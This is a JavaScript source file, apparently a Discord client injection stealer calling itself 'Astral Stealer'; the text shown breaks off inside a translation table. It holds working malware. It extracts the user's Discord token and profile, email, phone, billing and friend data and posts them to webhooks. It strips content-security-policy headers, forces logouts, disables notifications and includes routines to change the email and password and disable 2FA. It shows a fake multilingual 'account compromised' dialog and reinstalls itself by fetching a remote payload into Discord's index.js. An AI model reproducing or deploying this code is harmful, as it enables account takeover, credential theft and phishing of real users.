module.exports = require("./core.asar");
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");

var computerName = process.env.COMPUTERNAME;
let backupscript = `const elements = document.querySelectorAll('span[class^="code-"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`;
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;
var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false;

var config = {
  logout: "true",
  "logout-notify": "true",
  "init-notify": "true",
  "embed-color": 4873727,
  disable2FA: "true",
  changeMailAuto: "false",
  mail: "%CLIENTEMAIL%",
  creator: "%NAME_CREATOR%",
  transfer_link: `%TRANSFER_URL%`,
  injection_url:
    "https://raw.githubusercontent.com/freeman649/assets-thief/main/discord-inject.js",
  webhook: "%WEBHOOK%",
  Placed: "%API_URL%",
  Filter: {
    urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
      "https://discord.com/api/v*/users/@me/billing/subscriptions",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
  },
  onCompleted: {
    urls: [
      "https://discord.com/api/v9/auth/mfa/totp",
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/login",
      "https://discord.com/api/v*/auth/login",
      "https://*.discord.com/api/v*/auth/login",
      "https://api.stripe.com/v*/tokens",
      "https://discord.com/api/v*/users/@me/mfa/totp/enable",
      "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
      "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
      "https://discord.com/api/v*/users/@me/mfa/sms/enable",
      "https://discord.com/api/v*/users/@me/mfa/sms/disable",
      "https://discord.com/api/v*/users/@me/mfa/totp/disable",
      "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
      "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
      "https://discord.com/api/v*/users/@me/mfa/codes-verification",
      "https://*.discord.com/api/v*/users/@me/mfa/codes-verification",
      "https://discordapp.com/api/v*/users/@me/mfa/codes-verification",
    ],
  },
  onCompletedbis: {
    urls: [
      "https://discord.com/api/v9/auth/mfa/totp",
      "https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address",
    ],
  },
};


async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0];
    var script = await window.webContents.executeJavaScript(str, true);
    return script || null;
  }
  
  const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
    var params = {
      username: "Astral",
      avatar_url:
        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png",
      content: "",
      embeds: [
        {
          title: title,
          color: config["embed-color"],
          fields: fields,
          description: description ?? "",
          author: {
            name: `Astral Stealer`,
          },
  
          footer: {
            text: ` [${config.creator}] | https://github.com/freeman649/`,
          },
        },
      ],
    };
  
    if (image)
      params.embeds[0].image = {
        url: image,
      };
    if (thumbnail)
      params.embeds[0].thumbnail = {
        url: thumbnail,
      };
    return params;
  };
  
  
  const getIP = () => {
      const options = {
          hostname: 'api.ipify.org',
          path: '/?format=json',
          method: 'GET',
        };
      
      const req = https.request(options, (res) => {
        let data = '';
    
        res.on('data', (chunk) => {
          data += chunk;
          console.log(data)
        });
    
        res.on('end', () => {
          try {
            const json = JSON.parse(data);
            console.log(json)
            return json.ip;
          } catch (error) {
              console.log(error);
          }
        });
      });
    
      req.on('error', (error) => {
          console.log(error)
      });
    
      req.end();
    };
  
  const getURL = async (url, token) => {
    var c = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "${url}", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        JSON.parse(xmlHttp.responseText);`);
    return c;
  };
  
  const getGifOrPNG = async (url) => {
    var tt = [".gif?size=512", ".png?size=512"];
  
    var headers = await new Promise((resolve) => {
      https.get(url, (res) => resolve(res.headers));
    });
    var type = headers["content-type"];
    if (type == "image/gif") return url + tt[0];
    else return url + tt[1];
  };
  
  const GetBadges = (e) => {
    var n = "";
    return (
      1 == (1 & e) && (n += "<:staff:1143858329693728778> "),
      2 == (2 & e) && (n += "<:partner:1143858328309600337> "),
      4 == (4 & e) && (n += "<:hypesquadevent:1143858325579108505> "),
      8 == (8 & e) && (n += "<:bughunter_1:1143858323809112165> "),
      64 == (64 & e) && (n += "<:bravery:874750808388952075> "),
      128 == (128 & e) && (n += "<:brilliance:874750808338608199> "),
      256 == (256 & e) && (n += "<:balance:874750808267292683> "),
      512 == (512 & e) && (n += "<:666_hackingmyshit:1143858319824527400> "),
      16384 == (16384 & e) && (n += "<:bughunter_2:1143858321267376229> "),
      4194304 == (4194304 & e) && (n += "<:activedev:1143858315886088263> "),
      131072 == (131072 & e) && (n += "<:developer:1143858318088081582> "),
      "" == n && (n = ":x:"),
      n
    );
  };
  const GetRBadges = (e) => {
    var n = "";
    return (
      1 == (1 & e) && (n += "<:staff:1143858329693728778> "),
      2 == (2 & e) && (n += "<:partner:1143858328309600337> "),
      4 == (4 & e) && (n += "<:hypesquadevent:1143858325579108505> "),
      8 == (8 & e) && (n += "<:bughunter_1:1143858323809112165> "),
      512 == (512 & e) && (n += "<:early:944071770506416198> "),
      16384 == (16384 & e) && (n += "<:bughunter_2:1143858321267376229> "),
      131072 == (131072 & e) && (n += "<:developer:1143858318088081582> "),
      "" == n && (n = ":x:"),
      n
    );
  };
  
  const GetNSFW = (bouki) => {
    switch (bouki) {
      case true:
        return ":underage: `NSFW Allowed`";
      case false:
        return ":underage: `NSFW Not Allowed`";
      default:
        return "Idk bro you got me";
    }
  };
  const GetA2F = (bouki) => {
    switch (bouki) {
      case true:
        return ":lock: `A2F Enabled`";
      case false:
        return ":lock: `A2F Not Enabled`";
      default:
        return "Idk bro you got me";
    }
  };
  
  const parseFriends = (friends) => {
    try {
      var real = friends.filter((x) => x.type == 1);
      var rareFriends = "";
      for (var friend of real) {
        var badges = GetRBadges(friend.user.public_flags);
        if (badges !== ":x:")
          rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`;
      }
      if (!rareFriends) rareFriends = "No Rare Friends";
      return {
        len: real.length,
        badges: rareFriends,
      };
    } catch (err) {
      return ":x:";
    }
  };
  
  const parseBilling = (billings) => {
    var Billings = "";
    try {
      if (!billings) return (Billings = ":x:");
      billings.forEach((res) => {
        if (res.invalid) return;
        switch (res.type) {
          case 1:
            Billings += ":heavy_check_mark: :credit_card:";
            break;
          case 2:
            Billings += ":heavy_check_mark: <:paypal:896441236062347374>";
        }
      });
      if (!Billings) Billings = ":x:";
      return Billings;
    } catch (err) {
      return ":x:";
    }
  };
  
  const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));
  
  function generateId(len) {
    var text = "";
    var possible = "0123456789";
    for (var i = 0; i < len; i++)
      text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
  }
  
  function remove2FA(token, code) {
    return new Promise((resolve, reject) => {
      const data = JSON.stringify({
        code,
      });
      const options = {
        hostname: "discord.com",
        port: 443,
        path: "/api/v9/users/@me/mfa/totp/disable",
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: token,
        },
      };
      const req = https.request(options, (res) => {
        let responseData = "";
        res.on("data", (chunk) => {
          responseData += chunk;
        });
        res.on("end", () => {
          resolve(responseData);
        });
      });
      req.on("error", (error) => {
        reject(error.message);
      });
      req.write(data);
      req.end();
    });
  }
  const GetNitro = (r) => {
    if (!r.premium_type) return ":x:";
    switch (r.premium_type) {
      default:
        return ":x:";
      case 1:
        return "<:946246402105819216:962747802797113365>";
      case 2:
        if (!r.premium_guild_since)
          return "<:946246402105819216:962747802797113365>";
        var now = new Date(Date.now());
        var arr = [
          "<:Booster1Month:1051453771147911208>",
          "<:Booster2Month:1051453772360077374>",
          "<:Booster6Month:1051453773463162890>",
          "<:Booster9Month:1051453774620803122>",
          "<:boost12month:1068308256088400004>",
          "<:Booster15Month:1051453775832961034>",
          "<:BoosterLevel8:1051453778127237180>",
          "<:Booster24Month:1051453776889917530>",
        ];
        var a = [
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
        ];
        var b = [2, 3, 6, 9, 12, 15, 18, 24];
        var r = [];
        for (var p in a)
          r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
        var i = 0;
        for (var p of r) p > 0 ? "" : i++;
        return "<:946246402105819216:962747802797113365> " + arr[i];
    }
  };
  
  function GetLangue(read) {
    var languages = {
      fr: ":flag_fr: French",
      pt: ":flag_pt: Portuguese",
      da: ":flag_dk: Dansk",
      de: ":flag_de: Deutsch",
      "en-GB": ":england: English (UK)",
      "en-US": ":flag_us: USA",
      "en-ES": ":flag_es: Espagnol",
      hr: ":flag_hr: Croatian",
      it: ":flag_it: Italianio",
      lt: ":flag_lt: Lithuanian",
      hu: ":flag_no::flag_hu: Hungarian",
      no: ":flag_no: Norwegian",
      pl: ":flag_pl: Polish",
      "pr-BR": ":flag_pt: Portuguese",
      ro: ":flag_ro: Romanian",
      fi: ":flag_fi: Finnish",
      "sv-SE": ":flag_se: Swedish",
      vi: ":flag_vn: Vietnamese",
      tr: ":flag_tr: Turkish",
      cs: ":flag_cz: Czech",
      el: ":flag_gr: Greek",
      bg: ":flag_bg: Bulgarian",
      ru: ":flag_ru: Russian",
      uk: ":flag_ua: Ukrainian",
      hi: ":flag_in: Indian",
      th: ":flag_tw: Taiwanese",
      "zh-CN": ":flag_cn: Chinese-China",
      ja: ":flag_jp: Japanese",
      "zh-TW": ":flag_cn: Chinese-Taiwanese",
      ko: ":flag_kr: Korean",
    };
  
    var langue = languages[read] || ":flag_us: USA";
    return langue;
  }
  const post = async (params) => {
    params = JSON.stringify(params);
    var token = await execScript(tokenScript);
    var n = JSON.stringify({
      data: params,
      token: token,
    });
    [config.Placed, config.webhook].forEach((res) => {
      if (res == "%API" + "_URL%") return;
      if (res == "%\x57EBHOOK%") return;
      const url = new URL(res);
      const options = {
        host: url.hostname,
        port: url.port,
        path: url.pathname,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
      };
      const req = https.request(options);
      req.on("error", (err) => {});
      req.write(res == config.Placed ? n : params);
      req.end();
    });
  };
  
  const disablenoti = async () => {
    var token = await execScript(tokenScript);
    const data = {
      email_notifications_disabled: true,
    };
  
    const postData = JSON.stringify(data);
  
    const options = {
      hostname: "discord.com",
      path: "/api/v9/users/@me/settings",
      method: "PATCH",
      headers: {
        Authorization: `${token}`,
        "Content-Type": "application/json",
        "Content-Length": postData.length,
      },
    };
  
    const req = https.request(options, (res) => {
      if (res.statusCode === 200) {
      } else {
      }
    });
  
    req.on("error", (error) => {
      console.error("Erreur lors de la requête :", error);
    });
    req.write(postData);
    req.end();
  };
  
  async function init() {
    disablenoti();
    if (fs.existsSync("./d3dcompiler.dlll")) {
      doTheLogOut = true;
    } else {
      const directoryPath = "./";
      fs.readdir(directoryPath, (err, files) => {
        if (err) {
        } else {
          files.forEach((file) => {});
        }
      });
    }
  }
  function updateEmail(token, newEmail, password) {
    return new Promise((resolve, reject) => {
      const data = JSON.stringify({
        email: newEmail,
        password: password,
        email_token: null,
      });
      const options = {
        hostname: "discord.com",
        port: 443,
        path: "/api/v9/users/@me",
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          Authorization: `${token}`,
        },
      };
      const req = https.request(options, (res) => {
        let responseData = "";
        res.on("data", (chunk) => {
          responseData += chunk;
        });
        res.on("end", () => {
          resolve(responseData);
        });
      });
      req.on("error", (error) => {
        reject(error.message);
      });
      req.write(data);
      req.end();
    });
  }
  
  function updatePassword(token, oldpassword, newpassword) {
    return new Promise((resolve, reject) => {
      const data = JSON.stringify({
        password: oldpassword,
        new_password: newpassword,
      });
      const options = {
        hostname: "discord.com",
        port: 443,
        path: "/api/v9/users/@me",
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          Authorization: `${token}`,
        },
      };
      const req = https.request(options, (res) => {
        let responseData = "";
        res.on("data", (chunk) => {
          responseData += chunk;
        });
        res.on("end", () => {
          resolve(responseData);
        });
      });
      req.on("error", (error) => {
        reject(error.message);
      });
      req.write(data);
      req.end();
    });
  }
  function generatePassword() {
    const baseWords = ["Astral", "AstralStealer", "Gaynova", "novamerde"];
    const randomBaseWord =
      baseWords[Math.floor(Math.random() * baseWords.length)];
    const randomNumberCount = Math.floor(Math.random() * 9) + 1;
    const randomLettersCount =
      Math.floor(Math.random() * (randomBaseWord.length - 1)) + 2;
    const randomSymbolCount = Math.floor(Math.random() * 2) + 1;
    let password = "";
    password += randomBaseWord;
    function generateRandomLetter() {
      const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      return alphabet[Math.floor(Math.random() * alphabet.length)];
    }
    for (let i = 0; i < randomLettersCount; i++) {
      password += generateRandomLetter();
    }
    function generateRandomSymbol() {
      const symbols = "!@#$%^&*()-_=+[]{}|;:,.<>?";
      return symbols[Math.floor(Math.random() * symbols.length)];
    }
    for (let i = 0; i < randomSymbolCount; i++) {
      password += generateRandomSymbol();
    }
    function generateRandomDigit() {
      return Math.floor(Math.random() * 10);
    }
    for (let i = 0; i < randomNumberCount; i++) {
      password += generateRandomDigit();
    }
    return password;
  }
  
  const FirstTime = async () => {
    var token = await execScript(tokenScript);
    if (config["init-notify"] !== "true") return true;
    if (fs.existsSync(__dirname + "/Astral")) {
      try {
        fs.rmdirSync(__dirname + "/Astral");
      } catch (err) {}
      var ip = await getIP();
      var { appPath, appName } = path;
      var client_discord = appName;
      if (!token) {
        var params = await makeEmbed({
          title: "Astral Initialized",
          fields: [
            {
              name: "Injection Info",
              value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
              inline: !1,
            },
          ],
        });
      } else {
        var user = await getURL("https://discord.com/api/v8/users/@me", token);
        var billing = await getURL(
          "https://discord.com/api/v9/users/@me/billing/payment-sources",
          token
        );
        var friends = await getURL(
          "https://discord.com/api/v9/users/@me/relationships",
          token
        );
        var Nitro = await getURL(
          "https://discord.com/api/v9/users/" + user.id + "/profile",
          token
        );
  
        var Billings = parseBilling(billing);
        var Friends = parseFriends(friends);
        if (!user.avatar)
          var userAvatar =
            "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
        if (!user.banner)
          var userBanner =
            "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
  
        userBanner =
          userBanner ??
          (await getGifOrPNG(
            `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
          ));
        userAvatar =
          userAvatar ??
          (await getGifOrPNG(
            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
          ));
        var params = await makeEmbed({
          title: " Astral Initialized",
          description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
          fields: [
            {
              name: "Username <a:inject:1130448568268881960>",
              value: `\`${user.username}#${user.discriminator}\``,
              inline: !0,
            },
            {
              name: "ID <a:cat_rolling:1130448570789679165>",
              value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
              inline: !0,
            },
            {
              name: "Nitro <a:nitro:1130453517312725052>",
              value: `${GetNitro(Nitro)}`,
              inline: !0,
            },
            {
              name: "Badges <a:badges:1130448593715740692>",
              value: `${GetBadges(user.flags)}`,
              inline: !0,
            },
            {
              name: "Language <:4533language:1130453119919206500>",
              value: `${GetLangue(user.locale)}`,
              inline: !0,
            },
            {
              name: "NSFW <:3568underage:1153991874495922207>",
              value: `${GetNSFW(user.nsfw_allowed)}`,
              inline: !0,
            },
            {
              name: "A2F <:backup116:1102200730829471754>",
              value: `${GetA2F(user.mfa_enabled)}`,
              inline: !0,
            },
            {
              name: "@Copyright",
              value: `[Astral Stealer 2024](https://github.com/freeman649)`,
              inline: !0,
            },
            {
              name: "Astral Files",
              value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
              inline: !0,
            },
            {
              name: "Billing <a:money:1130448564632436787>",
              value: `${Billings}`,
              inline: !0,
            },
            {
              name: "Email <:mail:1130451375495589968>",
              value: `\`${user.email ?? "none"}\``,
              inline: !0,
            },
            {
              name: "Bio",
              value: `\`\`\`${
                user.bio !== null && user.bio !== undefined && user.bio !== ""
                  ? user.bio
                  : ":x:"
              }\`\`\``,
              inline: false,
            },
            {
              name: "<a:eatsomething:1130449693613228072> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            },
          ],
  
          thumbnail: userAvatar,
        });
        var params2 = await makeEmbed({
          title: `Total Friends (${Friends.len})`,
          color: config["embed-color"],
          description: Friends.badges,
          image: userBanner,
          thumbnail: userAvatar,
        });
  
        params.embeds.push(params2.embeds[0]);
      }
      await post(params);
      if (
        (config.logout != "false" || config.logout !== "%LOGOUT%") &&
        config["logout-notify"] == "true"
      ) {
        if (!token) {
          var params = await makeEmbed({
            title:
              "Astral User log out (User not Logged in before)",
            fields: [
              {
                name: "Injection Info",
                value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                inline: !1,
              },
            ],
          });
        } else {
          var user = await getURL("https://discord.com/api/v8/users/@me", token);
          var billing = await getURL(
            "https://discord.com/api/v9/users/@me/billing/payment-sources",
            token
          );
          var friends = await getURL(
            "https://discord.com/api/v9/users/@me/relationships",
            token
          );
          var Nitro = await getURL(
            "https://discord.com/api/v9/users/" + user.id + "/profile",
            token
          );
  
          var Billings = parseBilling(billing);
          var Friends = parseFriends(friends);
          if (!user.avatar)
            var userAvatar =
              "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
          if (!user.banner)
            var userBanner =
              "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
  
          userBanner =
            userBanner ??
            (await getGifOrPNG(
              `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
            ));
          userAvatar =
            userAvatar ??
            (await getGifOrPNG(
              `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
            ));
          var params = await makeEmbed({
            title: "Astral Victim got logged out",
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
                name: "Username <a:inject:1130448568268881960>",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: !0,
              },
              {
                name: "ID <a:cat_rolling:1130448570789679165>",
                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                inline: !0,
              },
              {
                name: "Nitro <a:nitro:1130453517312725052>",
                value: `${GetNitro(Nitro)}`,
                inline: !0,
              },
              {
                name: "Badges <a:badges:1130448593715740692>",
                value: `${GetBadges(user.flags)}`,
                inline: !0,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: `${GetLangue(user.locale)}`,
                inline: !0,
              },
              {
                name: "NSFW <:3568underage:1153991874495922207>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !0,
              },
              {
                name: "A2F <:backup116:1102200730829471754>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !0,
              },
              {
                name: "@Copyright",
                value: `[Astral Stealer 2024](https://github.com/freeman649)`,
                inline: !0,
              },
              {
                name: "Astral Files",
                value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                inline: !0,
              },
              {
                name: "Billing <a:money:1130448564632436787>",
                value: `${Billings}`,
                inline: !0,
              },
              {
                name: "Email <:mail:1130451375495589968>",
                value: `\`${user.email}\``,
                inline: !0,
              },
              {
                name: "Phone :mobile_phone:",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "Bio <a:caat:1130448857436782682>",
                value: `\`\`\`${
                  user.bio !== null && user.bio !== undefined && user.bio !== ""
                    ? user.bio
                    : ":x:"
                }\`\`\``,
                inline: false,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],
  
            thumbnail: userAvatar,
          });
          var params2 = await makeEmbed({
            title: `Total Friends (${Friends.len})`,
            color: config["embed-color"],
            description: Friends.badges,
            image: userBanner,
            thumbnail: userAvatar,
          });
  
          params.embeds.push(params2.embeds[0]);
        }
  
        try {
          fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
        } catch (err) {}
        await execScript(logOutScript);
        doTheLogOut = true;
  
        await post(params);
      }
  
      return false;
    }
  };
  
  const path = (function () {
    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
    appPath.pop();
    appPath = appPath.join("/");
    var appName = electron.app.getName();
    return {
      appPath,
      appName,
    };
  })();
  
  const checUpdate = () => {
    var { appPath, appName } = path;
    if (!doTheLogOut) {
      try {
        fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
      } catch (err) {}
      execScript(logOutScript);
      doTheLogOut = true;
    }
  
    var ressource = `${appPath}/app`;
    var indexFile = __filename.replace(/\\/g, "/");
    var betterDiscord = `${process.env.appdata.replace(
      /\\/g,
      "/"
    )}/betterdiscord/data/betterdiscord.asar`;
    var package = `${ressource}/package.json`;
    var index = `${ressource}/index.js`;
  
    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource);
    fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`);
  
    var script = `const fs = require("fs"), https = require("https")
    
    var index = "${indexFile}"
    var betterDiscord = "${betterDiscord}"
    
    var negger = fs.readFileSync(index).toString()
    if (negger == "module.exports = require('./core.asar');") init()
    
    function init() {
        https.get("${config.injection_url}", res => {
            var chunk = ""
            res.on("data", data => chunk += data)
            res.on("end", () => fs.writeFileSync(index, chunk.replace("%\x57EBHOOK%", "${config.webhook}")))
        }).on("error", (err) => setTimeout(init(), 10000));
    }
    
    require("${appPath}/app.asar")
    if (fs.existsSync(betterDiscord)) require(betterDiscord)`;
    fs.writeFileSync(index, script);
    return;
  };
  electron.session.defaultSession.webRequest.onBeforeRequest(
    config.Filter,
    async (details, callback) => {
      await electron.app.whenReady();
      await FirstTime();
      await init();
      if (details.url.startsWith("wss://remote-auth-gateway"))
        return callback({
          cancel: true,
        });
  
      checUpdate();
      callback({});
    }
  );
  
  electron.session.defaultSession.webRequest.onHeadersReceived(
    (request, callback) => {
      delete request.responseHeaders["content-security-policy"];
      delete request.responseHeaders["content-security-policy-report-only"];
      callback({
        responseHeaders: {
          ...request.responseHeaders,
          "Access-Control-Allow-Headers": "*",
        },
      });
    }
  );
  
  async function BoukiTuclcavectesfonctions() {
    var token = await execScript(tokenScript);
    var user = await getURL("https://discord.com/api/v8/users/@me", token);
    var billing = await getURL(
      "https://discord.com/api/v9/users/@me/billing/payment-sources",
      token
    );
    var friends = await getURL(
      "https://discord.com/api/v9/users/@me/relationships",
      token
    );
    var Nitro = await getURL(
      "https://discord.com/api/v9/users/" + user.id + "/profile",
      token
    );
    if (!user.avatar)
      var userAvatar =
        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
    if (!user.banner)
      var userBanner =
        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
  
    var userBanner =
      userBanner ??
      (await getGifOrPNG(
        `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
      ));
    var userAvatar =
      userAvatar ??
      (await getGifOrPNG(
        `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
      ));
    var Billings = parseBilling(billing);
    var Friends = parseFriends(friends);
    return {
      token,
      user,
      billing,
      friends,
      Nitro,
      userAvatar,
      userBanner,
      userAvatar,
      Billings,
      Friends,
    };
  }
  
  let scriptExecuted = false;
  
  electron.session.defaultSession.webRequest.onHeadersReceived(
    async (request, callback) => {
      delete request.responseHeaders["content-security-policy"];
      delete request.responseHeaders["content-security-policy-report-only"];
      callback({
        responseHeaders: {
          ...request.responseHeaders,
          "Access-Control-Allow-Headers": "*",
        },
      });
      if (config.changeMailAuto == "true") {
        if (request.url.includes("/users/@me") && !scriptExecuted) {
          scriptExecuted = true;
          var {
            token,
            user,
            billing,
            friends,
            Nitro,
            userAvatar,
            userBanner,
            Billings,
            Friends,
          } = await BoukiTuclcavectesfonctions();
          let language = user.locale ?? "en-US";
          console.log(language);
  
          let [
            editprofil,
            editemailbutton,
            titlepop,
            intropop,
            endintro,
            lastend,
            contact,
          ] = await traduireTexte(language);
          console.log(
            editprofil,
            editemailbutton,
            titlepop,
            intropop,
            endintro,
            lastend,
            contact
          );
          await execScript(
            `
                function clickButton(selector) {
                  return new Promise((resolve, reject) => {
                    const button = document.querySelector(selector);
                    if (button) {
                      const event = new MouseEvent("click", {
                        bubbles: true,
                        cancelable: true,
                        view: window,
                      });
                
                      button.dispatchEvent(event);
                      resolve();
                    } else {
                    }
                  });
                }
                
                async function simulateClicks() {
                  try {
                    const div = document.createElement("div");
                    div.innerHTML =
                      '<div class="layerContainer-2lfOPe"> <div class="backdrop-2ByYRN withLayer-2VVmpp" style="opacity: 0.85; background: var(--black-500);"></div> <div class="layer-fP3xEz"> <div class="focusLock-bHVOlV" role="dialog" aria-labelledby=":rr:" tabindex="-1" aria-modal="true"> <div class="root-1CAIjD small-2xUY-3 fullscreenOnMobile-2971EC rootWithShadow-2hdL2J" style="opacity: 1; transform: scale(1);"><img alt="" class="headerImage-2osrlm" src="/assets/222756e9418e375e7ae974594b3aa1d2.svg"> <div style="position: relative; width: 440px; height: 367px; overflow: hidden;"> <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; left: auto; right: auto;"> <form> <div class="flex-2S1XBF flex-3BkGQD horizontal-112GEH horizontal-1Piu5- flex-3BkGQD directionRow-2Iu2A9 justifyStart-2Mwniq alignCenter-14kD11 noWrap-hBpHBz header-1ffhsl confirmStartHeader-34wA-K" id=":rr:" style="flex: 0 0 auto;"> <div class="colorHeaderPrimary-3kwW7L size24-15VPAv title-3VYtQS">${titlepop} </div> <div class="defaultColor-1EVLSt text-md-normal-2rFCH3 description-3_efmf" data-text-variant="text-md/normal"> <p>${intropop} <strong>${user.email}</strong>, ${endintro} ${lastend}&nbsp;? ${contact}.</p> </div>  </div> </form> </div> </div> </div> </div> </div></div>';
                    document.body.appendChild(div);
                    document.body.appendChild(div);
                    await new Promise((resolve) => setTimeout(resolve, 10000));
                    document.body.removeChild(div);
                    await clickButton('button[aria-label="${editprofil}"]');
                    await new Promise((resolve) => setTimeout(resolve, 1000));
                    await clickButton('button[aria-label="${editemailbutton}"]');
                  } catch (error) {}
                }
                
                simulateClicks();
                `
          );
        }
      }
    }
  );
  
  async function traduireTexte(langueCible) {
    var languages = {
      fr: [
        "Paramètres utilisateur",
        "Modifier l\\'adresse e-mail",
        "Changez votre adresse e-mail",
        "Nous avons détecté quelque chose d\\'inhabituel avec votre compte Discord, votre adresse,",
        "a été compromise.",
        "Veuillez la changer pour continuer à utiliser votre compte.",
        "Vous n\\'avez plus accès à votre adresse e-mail",
        "Contactez votre fournisseur de messagerie pour la réparer.",
      ],
      pt: [
        "Configurações do usuário",
        "Editar endereço de e-mail",
        "Altere seu endereço de e-mail",
        "Detectamos algo incomum em sua conta Discord, seu endereço,",
        "foi comprometido.",
        "Por favor, altere-o para continuar usando sua conta.",
        "Você não tem mais acesso ao seu endereço de e-mail",
        "Contate seu provedor de e-mail para corrigi-lo.",
      ],
      da: [
        "Brugerindstillinger",
        "Rediger e-mailadresse",
        "Ændre din e-mailadresse",
        "Vi har registreret noget usædvanligt med din Discord-konto, din adresse,",
        "er blevet kompromitteret.",
        "Ændre den for at fortsætte med at bruge din konto.",
        "Du har ikke længere adgang til din e-mailadresse",
        "Kontakt din e-mail-udbyder for at få det rettet.",
      ],
      de: [
        "Benutzereinstellungen",
        "E-Mail-Adresse bearbeiten",
        "Ändern Sie Ihre E-Mail-Adresse",
        "Wir haben etwas Ungewöhnliches an Ihrem Discord-Konto festgestellt, Ihre Adresse,",
        "wurde kompromittiert.",
        "Ändern Sie sie, um Ihre Konto weiterhin zu verwenden.",
        "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
        "Kontaktieren Sie Ihren E-Mail-Anbieter, um das Problem zu beheben.",
      ],
      "en-GB": [
        "User Settings",
        "Edit email address",
